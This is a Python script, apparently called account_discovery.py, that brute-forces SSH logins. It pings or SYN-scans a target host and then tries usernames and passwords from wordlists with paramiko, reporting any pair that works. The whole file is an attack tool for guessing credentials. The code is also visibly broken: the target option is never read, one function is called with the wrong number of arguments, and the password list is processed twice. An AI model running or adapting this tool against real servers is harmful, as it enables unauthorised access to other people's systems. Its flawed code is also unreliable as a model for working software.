import paramiko 
from scapy.all import *
import sys
import subprocess


GREEN = "\033[92m"
RED   = "\033[91m"
END = "\033[0m"

try:
    v=False

    def PingHost(host,username,password,v):
        res = subprocess.run(["ping","-n","1",host], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if res.returncode == 0:
            SSHlogin(host,username,password,v)
        else:
            print(f"{RED}{host} DOWN .{END}")
            sys.exit()

    def ScanSSH(host, username, password, v):
        scan = False
        ret , _ = sr(IP(dst=host)/TCP(sport=8888,dport=22, flags="S"),timeout=5, verbose=0)
        for (_,r) in ret :
            if r.haslayer(TCP) and r[TCP].flags == 0x12:
                scan = True
                SSHlogin(host,username,password,scan,v)
            else : 
                print(RED+"the SSH are closed."+END)
                sys.exit()


    def SSHlogin(host, username, password,v):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            ssh.connect(host,port=22,username=username,password=password,timeout=5,auth_timeout=5)
            ssh_session = ssh.get_transport().open_session()

            if ssh_session.active:
                print(f"{GREEN}[+]SSH SUCCES:{userfix}:{password}{END}")
                sys.exit()

        except Exception :
            if v == True:
                print(f"{RED}[-]{username}:{password}{END}")
                ssh.close()


    help_msg = """
    Usage: account_discovery.py -t [host] [options]

    Options:
    -t [host]            Target host IP
    -D [wordlist]        Combined user:pass wordlist, with extension '.txt'
    -s [separator]       Separator for -D (e.g., ':' or ' ')
    -u [username]        Single fixed username
    -p [pass_list]       Wordlist of passwords ,with extension '.txt'
    -v                   Verbose mode (show failed attempts)
    -h                   Show this help message
    """

    
    if "-h" in sys.argv:
        print(help_msg)
        sys.exit()


    
    if "-v" in sys.argv:
        v = True

    
    if "-D" in sys.argv and "-s" in sys.argv: 
        use_combined = True
    else: 
        use_combined = False
    
    if "-u" in sys.argv and "-p" in sys.argv:
        use_user_pass = True
    else : 
        use_user_pass = False

    if use_user_pass:
        userfix = sys.argv[sys.argv.index("-u") + 1]
        passwordlist = sys.argv[sys.argv.index("-p") + 1]
        
        try:
            with open(passwordlist, "r") as f:
                for line in f:
                    PingHost(host, userfix, line.strip(), v)
        except FileNotFoundError:
            print(f"Error: Password list '{passwordlist}' not found.")

    elif use_combined:
        wordlist = sys.argv[sys.argv.index("-D") + 1]
        spli = sys.argv[sys.argv.index("-s") + 1]
    try:    
        if use_user_pass:
            with open(passwordlist,"r") as f :
                for line in f : 
                    vals = line
                    username = userfix
                    password = vals.strip()
                    
                    PingHost(host, username, password, v)
        else : 
            pass
    except:
        sys.exit()

    try:
        if use_combined:
            with open(wordlist,"r") as f :
                for line in f : 
                    vals = line.split(spli)
                    username = vals[0].strip()
                    password = vals[1].strip()
                    
                    PingHost(host, username, password ,v )
    except:
        sys.exit()

except InterruptedError:
    sys.exit()
        

